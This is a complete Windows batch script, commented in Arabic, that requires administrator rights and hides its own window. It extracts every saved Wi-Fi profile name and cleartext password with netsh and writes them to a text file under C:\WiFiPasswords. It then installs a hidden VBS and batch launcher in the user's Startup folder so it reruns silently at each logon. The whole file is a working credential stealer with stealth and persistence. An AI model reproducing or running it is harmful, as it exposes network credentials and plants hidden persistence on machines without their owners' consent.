@echo off
:: تشغيل كمسؤول
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo يجب تشغيل هذا الملف كمسؤول!
    pause
    exit /b
)

:: إخفاء نافذة التشغيل
if not "%1"=="h" (
    start /min cmd /c %0 h
    exit
)

:: ضبط متغيرات المسارات
set "output_dir=C:\WiFiPasswords"
set "output_file=%output_dir%\yourpasswords.txt"
set "startup_file=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\wifi_logger.vbs"
set "batch_file=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\wifi_logger.bat"

:: إنشاء مجلد لحفظ كلمات المرور إن لم يكن موجودًا
if not exist "%output_dir%" mkdir "%output_dir%"

:: إنشاء أو تحديث ملف كلمات المرور
echo Wi-Fi Passwords Saved on %DATE% %TIME% > "%output_file%"
echo =============================================== >> "%output_file%"

:: تفعيل دعم توسيع المتغيرات المتأخرة
setlocal enabledelayedexpansion

:: استخراج أسماء الشبكات
for /f "tokens=2 delims=:" %%a in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    set "profile_name=%%a"
    set "profile_name=!profile_name:~1!"

    :: استخراج كلمات المرور
    for /f "tokens=2 delims=:" %%b in ('netsh wlan show profile name="!profile_name!" key=clear ^| findstr "Key Content"') do (
        set "password=%%b"
        set "password=!password:~1!"
        echo SSID: !profile_name! - Password: !password! >> "%output_file%"
    )
)

:: إزالة تفعيل توسيع المتغيرات المتأخرة
endlocal

:: التحقق من وجود ملف بدء التشغيل، وإن لم يكن موجودًا يتم إنشاؤه
if not exist "%startup_file%" (
    echo Set WshShell = CreateObject("WScript.Shell") > "%startup_file%"
    echo WshShell.Run """%batch_file%""", 0, False >> "%startup_file%"
    
    echo @echo off > "%batch_file%"
    echo start /min cmd /c "%~f0 h" >> "%batch_file%"
    
    echo تم إضافة البرنامج إلى بدء التشغيل بشكل مخفي.
) else (
    echo البرنامج مضاف مسبقًا إلى بدء التشغيل.
)

exit
